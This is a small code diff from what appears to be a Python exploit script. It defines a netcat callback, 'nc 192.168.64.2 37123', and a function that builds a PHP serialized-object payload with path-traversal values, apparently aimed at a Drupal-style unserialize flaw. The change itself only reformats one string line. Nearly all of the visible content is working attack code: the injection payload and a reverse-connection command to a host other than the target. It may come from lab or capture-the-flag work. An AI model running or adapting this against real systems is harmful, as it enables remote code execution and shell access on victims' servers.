@@ -9,7 +9,8 @@ BEACHHEAD = 'nc 192.168.64.2 37123'
 
 def create_exploit(payload: str) -> str:
     p = ''
-    p += 'a:6:{s:5:"paths";a:3:{s:12:"modules_base";s:8:"../../..";s:10:"files_base";s:5:"../..";s:14:"libraries_base";s:5:"../..";}'
+    p += 'a:6:{s:5:"paths";a:3:{s:12:"modules_base";s:8:"../../..";'
+    p += 's:10:"files_base";s:5:"../..";s:14:"libraries_base";s:5:"../..";}'
     p += 's:11:"theme_cache";s:16:"theme_cache_test";'
     p += 's:9:"variables";s:14:"variables_test";'
     p += 's:8:"upgrades";a:1:{i:0;a:2:{s:4:"path";s:2:"..";s:6:"module";s:3:"foo";}}'
